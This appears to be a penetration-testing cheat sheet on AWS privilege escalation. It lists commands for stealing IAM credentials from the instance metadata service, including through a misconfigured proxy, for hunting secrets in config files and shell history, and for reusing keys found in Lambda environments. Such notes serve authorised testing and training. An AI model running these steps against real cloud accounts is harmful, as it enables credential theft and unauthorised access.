# Privilege Escalation
## Index
* [Getting Credentials](#Getting-credentials)
  * [Check for scripts](#Check-for-scripts)  
  * [Instance Metadata Service URL](#Instance-Metadata-Service-URL)
  * [Web config and App config files](#Web-config-and-App-config-files)
  * [Internal repositories](#Internal-repositories)
  * [Command history](#Command-history)
* [PACU Scan for privesc](#PACU)
* [Execute commands on vm's](#Execute-commands-on-VM's)
* [Gain AWS console access](#Gain-AWS-console-access)
* [Lamda](#Lamda)

## Getting credentials
### Check for scripts
- Check the following dirs for scripts/creds:
  - ``` C:\ProgramData\Amazon```
  - ```C:\Program Files\Amazon\WorkSpacesConfig\```

### Instance Metadata Service URL
- For example possible by SSRF or when having access to the file system
```
http://169.254.169.254/latest/meta-data
```

#### Additional IAM creds possibly available here

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

### Web config and App config files
-  ```Web.config``` and ```app.config``` files might contain creds or access tokens.
- Look for management cert and extract to ```.pfx``` like publishsettings files
```
sudo find / -name web.config 2>/dev/null
Get-ChildItem -Path C:\ -Filter app.config -Recurse -ErrorAction SilentlyContinue -Force
```

### Internal repositories
- Find internal repos (scan for port 80, 443 or Query AD and look for subdomains or hostnames as git, code, repo, gitlab, bitbucket etc)
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog

### Command history
- Look through command history
- ```~/.bash_history`` or ```%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
```
sudo find / -name .bash_history 2>/dev/null
Get-ChildItem -Path C:\ -Filter *ConsoleHost_history.txt* -Recurse -ErrorAction SilentlyContinue -Force
```

## PACU 
#### Check for privilege escalation
```bash
run iam__privesc_scan
```

## Execute commands on VM's
- Requires EC2COnfig or System Manager agent on instances
- Or SSH keys
- Can use GUI to connect

## Gain AWS console access
- https://github.com/NetSPI/aws_consoler

## Lamda
### Read lamda functions
- Copy access keys found in the environment variables
```
sudo aws lambda list-functions --profile <PROFILE> --region <REGION>
```

#### Create a new profile for the access keys
```
sudo aws configure --profile <PROFILE>
```

#### Use the creds, for example list ec2 instances:
```
sudo aws ec2 describe-instances --profile <PROFILE> --region <REGION>
```
